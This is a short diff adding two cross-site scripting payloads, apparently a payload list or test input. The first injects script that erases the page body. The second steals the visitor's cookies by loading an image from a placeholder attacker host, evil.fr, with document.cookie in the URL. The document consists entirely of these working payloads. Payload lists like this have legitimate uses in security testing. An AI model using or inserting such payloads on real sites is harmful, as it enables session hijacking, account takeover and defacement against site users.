@@ -1,0 +1,2 @@
+<script>document.body.innerHTML = ''</script>;
+<script>var i=document.createElement('img');i.src='http://evil.fr?c='+document.cookie;document.body.appendChild(i)</script>
